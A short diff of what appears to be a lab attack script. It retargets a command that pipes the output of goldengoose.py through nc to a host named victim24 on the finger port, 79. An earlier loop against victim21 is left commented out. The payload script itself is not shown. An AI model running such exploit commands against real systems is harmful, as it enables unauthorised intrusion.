@@ -5,4 +5,4 @@
 #   python3 goldengoose.py $i | nc victim21 79
 #done
 
-python3 goldengoose.py 4178 | nc victim21 79
+python3 goldengoose.py 4178 | nc victim24 79
